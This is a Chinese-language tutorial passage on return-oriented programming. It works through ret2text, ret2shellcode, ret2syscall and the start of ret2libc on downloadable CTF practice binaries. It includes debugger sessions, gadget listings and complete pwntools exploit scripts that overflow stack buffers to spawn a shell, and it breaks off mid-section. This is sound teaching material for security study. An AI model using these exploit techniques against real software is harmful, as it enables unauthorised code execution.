<h1 id="Basic-ROP"><a href="#Basic-ROP" class="headerlink" title="Basic ROP"></a>Basic ROP</h1><h2 id="基本-ROP"><a href="#基本-ROP" class="headerlink" title="基本 ROP"></a>基本 ROP</h2><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
<p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p>
<ul>
<li>程序存在溢出，并且可以控制返回地址。</li>
<li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li>
</ul>
<p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p>
<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
<p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>其实，在栈溢出的基本原理中，我们已经介绍了这一简单的攻击。在这里，我们再给出另外一个例子，bamboofox 中介绍 ROP 时使用的 ret2text 的例子。</p>
<p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p>
<p>首先，查看一下程序的保护机制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ checksec ret2text</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;ol4three&#x2F;Desktop&#x2F;ret2text&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>可以看出程序是 32 位程序，其仅仅开启了栈不可执行保护。然后，我们使用 IDA 来查看源代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [esp+1Ch] [ebp-64h]</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(_bss_start, 0, 1, 0);</span><br><span class="line">  puts(&quot;There is something amazing here, do you know anything?&quot;);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  printf(&quot;Maybe I will tell you next time !&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。此后又发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:080485FD secure          db 55h</span><br><span class="line">.text:080485FE ; ---------------------------------------------------------------------------</span><br><span class="line">.text:080485FE                 mov     ebp, esp</span><br><span class="line">.text:08048600                 sub     esp, 28h</span><br><span class="line">.text:08048603                 mov     dword ptr [esp], 0 ; timer</span><br><span class="line">.text:0804860A                 call    _time</span><br><span class="line">.text:0804860F                 mov     [esp], eax      ; seed</span><br><span class="line">.text:08048612                 call    _srand</span><br><span class="line">.text:08048617                 call    _rand</span><br><span class="line">.text:0804861C                 mov     [ebp-0Ch], eax</span><br><span class="line">.text:0804861F                 lea     eax, [ebp-10h]</span><br><span class="line">.text:08048622                 mov     [esp+4], eax</span><br><span class="line">.text:08048626                 mov     dword ptr [esp], offset unk_8048760</span><br><span class="line">.text:0804862D                 call    ___isoc99_scanf</span><br><span class="line">.text:08048632                 mov     eax, [ebp-10h]</span><br><span class="line">.text:08048635                 cmp     eax, [ebp-0Ch]</span><br><span class="line">.text:08048638                 jnz     short locret_8048646</span><br><span class="line">.text:0804863A                 mov     dword ptr [esp], offset command ; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">.text:08048641                 call    _system</span><br></pre></td></tr></table></figure>

<p>在 secure 函数又发现了存在调用 system(“/bin/sh”) 的代码，那么如果我们直接控制程序返回至 0804863A，那么就可以得到系统的 shell 了。</p>
<p>下面就是我们如何构造 payload 了，首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:080486A7                 lea     eax, [esp+1Ch]</span><br><span class="line">.text:080486AB                 mov     [esp], eax      ; s</span><br><span class="line">.text:080486AE                 call    _gets</span><br></pre></td></tr></table></figure>

<p>可以看到该字符串是通过相对于 esp 的索引，所以我们需要进行调试，将断点下在 call 处，查看 esp，ebp，如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; b *0x080486ae</span><br><span class="line">Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: &#x2F;home&#x2F;ol4three&#x2F;Desktop&#x2F;ret2text</span><br><span class="line">There is something amazing here, do you know anything?</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080486ae in main () at ret2text.c:24</span><br><span class="line">24	ret2text.c: No such file or directory.</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0xffffd4dc —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x26f34</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xf7fb2dc7 (_IO_2_1_stdout_+71) ◂— 0xfb38900a</span><br><span class="line"> EDX  0xf7fb3890 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> EDI  0x0</span><br><span class="line"> ESI  0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c</span><br><span class="line"> EBP  0xffffd548 ◂— 0x0</span><br><span class="line"> ESP  0xffffd4c0 —▸ 0xffffd4dc —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x26f34</span><br><span class="line"> EIP  0x80486ae (main+102) —▸ 0xfffdade8 ◂— 0xfffdade8</span><br><span class="line">──────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure>

<p>可以看到 esp 为 0xffffd4c0，ebp 为 0xffffd548，同时 s 相对于 esp 的索引为 <code>esp+0x1c</code>，因此，我们可以推断</p>
<ul>
<li>s 的地址为 0xffffd4dc</li>
<li>s 相对于 ebp 的偏移为 0x6c</li>
<li>s 相对于返回地址的偏移为 0x6c+4</li>
</ul>
<p>最后的 payload 如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">##!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2text&#39;)</span><br><span class="line">target &#x3D; 0x804863a</span><br><span class="line">sh.sendline(&#39;A&#39; * (0x6c+4) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong>。</p>
<p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p>
<h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><p>这里我们以 bamboofox 中的 ret2shellcode 为例</p>
<p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p>
<p>首先检测程序开启的保护</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ checksec ret2shellcode</span><br><span class="line">[*] &#39;&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;ret2shellcode&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<p>可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。我们再使用 IDA 看一下程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [esp+1Ch] [ebp-64h]</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  puts(&quot;No system for you this time !!!&quot;);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  strncpy(buf2, &amp;s, 0x64u);</span><br><span class="line">  printf(&quot;bye bye ~&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br></pre></td></tr></table></figure>

<p>这时，我们简单的调试下程序，看看这一个 bss 段是否可执行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; b *main</span><br><span class="line">Breakpoint 1 at 0x804852d: file ret2shellcode.c, line 7.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: &#x2F;home&#x2F;ol4three&#x2F;Desktop&#x2F;ret2shellcode</span><br><span class="line"></span><br><span class="line">Breakpoint 1, main () at ret2shellcode.c:7</span><br><span class="line">7	ret2shellcode.c: No such file or directory.</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0xf7fb3dd8 (environ) —▸ 0xffffd5dc —▸ 0xffffd73f ◂— &#39;LANG&#x3D;en_US.UTF-8&#39;</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xec9ad2b</span><br><span class="line"> EDX  0xffffd564 ◂— 0x0</span><br><span class="line"> EDI  0x0</span><br><span class="line"> ESI  0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c</span><br><span class="line"> EBP  0x0</span><br><span class="line"> ESP  0xffffd53c —▸ 0xf7df2f21 (__libc_start_main+241) ◂— add    esp, 0x10</span><br><span class="line"> EIP  0x804852d (main) ◂— push   ebp</span><br><span class="line">──────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x804852d &lt;main&gt;       push   ebp</span><br><span class="line">   0x804852e &lt;main+1&gt;     mov    ebp, esp</span><br><span class="line">   0x8048530 &lt;main+3&gt;     and    esp, 0xfffffff0</span><br><span class="line">   0x8048533 &lt;main+6&gt;     add    esp, -0x80</span><br><span class="line">   0x8048536 &lt;main+9&gt;     mov    eax, dword ptr [stdout@@GLIBC_2.0] &lt;0x804a060&gt;</span><br><span class="line">   0x804853b &lt;main+14&gt;    mov    dword ptr [esp + 0xc], 0</span><br><span class="line">   0x8048543 &lt;main+22&gt;    mov    dword ptr [esp + 8], 2</span><br><span class="line">   0x804854b &lt;main+30&gt;    mov    dword ptr [esp + 4], 0</span><br><span class="line">   0x8048553 &lt;main+38&gt;    mov    dword ptr [esp], eax</span><br><span class="line">   0x8048556 &lt;main+41&gt;    call   setvbuf@plt &lt;setvbuf@plt&gt;</span><br><span class="line"></span><br><span class="line">   0x804855b &lt;main+46&gt;    mov    eax, dword ptr [stdin@@GLIBC_2.0] &lt;0x804a040&gt;</span><br><span class="line">───────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd53c —▸ 0xf7df2f21 (__libc_start_main+241) ◂— add    esp, 0x10</span><br><span class="line">01:0004│      0xffffd540 ◂— 0x1</span><br><span class="line">02:0008│      0xffffd544 —▸ 0xffffd5d4 —▸ 0xffffd71a ◂— &#39;&#x2F;home&#x2F;ol4three&#x2F;Desktop&#x2F;ret2shellcode&#39;</span><br><span class="line">03:000c│      0xffffd548 —▸ 0xffffd5dc —▸ 0xffffd73f ◂— &#39;LANG&#x3D;en_US.UTF-8&#39;</span><br><span class="line">04:0010│      0xffffd54c —▸ 0xffffd564 ◂— 0x0</span><br><span class="line">05:0014│      0xffffd550 ◂— 0x1</span><br><span class="line">06:0018│      0xffffd554 ◂— 0x0</span><br><span class="line">07:001c│      0xffffd558 —▸ 0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c</span><br><span class="line">─────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0  804852d main</span><br><span class="line">   f 1 f7df2f21 __libc_start_main+241</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000 0      &#x2F;home&#x2F;ol4three&#x2F;Desktop&#x2F;ret2shellcode</span><br><span class="line"> 0x8049000  0x804a000 r-xp     1000 0      &#x2F;home&#x2F;ol4three&#x2F;Desktop&#x2F;ret2shellcode</span><br><span class="line"> 0x804a000  0x804b000 rwxp     1000 1000   &#x2F;home&#x2F;ol4three&#x2F;Desktop&#x2F;ret2shellcode</span><br><span class="line">0xf7dda000 0xf7faf000 r-xp   1d5000 0      &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7faf000 0xf7fb0000 ---p     1000 1d5000 &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7fb0000 0xf7fb2000 r-xp     2000 1d5000 &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7fb2000 0xf7fb3000 rwxp     1000 1d7000 &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7fb3000 0xf7fb6000 rwxp     3000 0</span><br><span class="line">0xf7fd0000 0xf7fd2000 rwxp     2000 0</span><br><span class="line">0xf7fd2000 0xf7fd5000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7fd5000 0xf7fd6000 r-xp     1000 0      [vdso]</span><br><span class="line">0xf7fd6000 0xf7ffc000 r-xp    26000 0      &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 r-xp     1000 25000  &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 rwxp     1000 26000  &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xfffdd000 0xffffe000 rwxp    21000 0      [stack]</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x804a000  0x804b000 rwxp     1000 1000   &#x2F;home&#x2F;ol4three&#x2F;Desktop&#x2F;ret2shellcode</span><br></pre></td></tr></table></figure>

<p>那么这次我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。</p>
<p>具体的 payload 如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2shellcode&#39;)</span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class="line">buf2_addr &#x3D; 0x804a080</span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(112, &#39;A&#39;) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>题目 </p>
<ul>
<li>sniperoj-pwn100-shellcode-x86-64</li>
</ul>
<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p>
<h3 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h3><p>这里我们以 bamboofox 中的 ret2syscall 为例</p>
<p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a></p>
<p>首先检测程序开启的保护</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ checksec ret2syscall</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;ol4three&#x2F;Desktop&#x2F;ret2syscall&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>可以看出，源程序为 32 位，开启了 NX 保护。接下来利用 IDA 来查看源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; &#x2F;&#x2F; [esp+1Ch] [ebp-64h]</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  puts(&quot;This time, no system() and NO SHELLCODE!!!&quot;);</span><br><span class="line">  puts(&quot;What do you plan to do?&quot;);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201223161605795.png" alt="image-20201223161605795"></p>
<p>此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。关于系统调用的知识，请参考</p>
<ul>
<li><a href="https://zh.wikipedia.org/wiki/系统调用">https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8</a></li>
</ul>
<p>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">execve(&quot;&#x2F;bin&#x2F;sh&quot;,NULL,NULL)</span><br></pre></td></tr></table></figure>

<p>其中，该程序是 32 位，所以我们需要使得</p>
<ul>
<li>系统调用号，即 eax 应该为 0xb</li>
<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>
<li>第二个参数，即 ecx 应该为 0</li>
<li>第三个参数，即 edx 应该为 0</li>
</ul>
<p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p>
<p>首先，我们来寻找控制 eax 的 gadgets</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary ret2syscall  --only &#39;pop|ret&#39; | grep &#39;eax&#39;</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>

<p>可以看到有上述几个都可以控制 eax，我选取第二个来作为 gadgets。</p>
<p>类似的，我们可以得到控制其它寄存器的 gadgets</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary ret2syscall  --only &#39;pop|ret&#39; | grep &#39;ebx&#39;</span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure>

<p>这里，选择</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure>

<p>这个可以直接控制其它三个寄存器。</p>
<p>此外，我们需要获得 /bin/sh 字符串对应的地址。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary ret2syscall  --string &#39;&#x2F;bin&#x2F;sh&#39;</span><br><span class="line">Strings information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x080be408 : &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<p>可以找到对应的地址，此外，还有 int 0x80 的地址，如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary ret2syscall  --only &#39;int&#39;</span><br><span class="line">Gadgets information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 1</span><br></pre></td></tr></table></figure>

<p>同时，也找到对应的地址了。</p>
<p>下面就是对应的 payload，其中 0xb 为 execve 对应的系统调用号。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2syscall&#39;)</span><br><span class="line"></span><br><span class="line">pop_eax_ret &#x3D; 0x080bb196</span><br><span class="line">pop_edx_ecx_ebx_ret &#x3D; 0x0806eb90</span><br><span class="line">int_0x80 &#x3D; 0x08049421</span><br><span class="line">bin_sh &#x3D; 0x080be408</span><br><span class="line"></span><br><span class="line">payload &#x3D; flat([&#39;A&#39; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, bin_sh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><blockquote>
<p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>
</blockquote>
<h3 id="例子1"><a href="#例子1" class="headerlink" title="例子1"></a>例子1</h3><p>这里我们以 bamboofox 中 ret2libc1 为例</p>
<p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">ret2libc1</a></p>
<p>首先，我们可以检查一下程序的安全保护</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ checksec ret2libc1</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;ol4three&#x2F;Desktop&#x2F;ret2libc1&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>源程序为 32 位，开启了 NX 保护。下面来看一下程序源代码，确定漏洞位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [esp+1Ch] [ebp-64h]</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(_bss_start, 0, 1, 0);</span><br><span class="line">  puts(&quot;RET2LIBC &gt;_&lt;&quot;);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到在执行 gets 函数的时候出现了栈溢出。此外，利用 ropgadget，我们可以查看是否有 /bin/sh 存在</p>
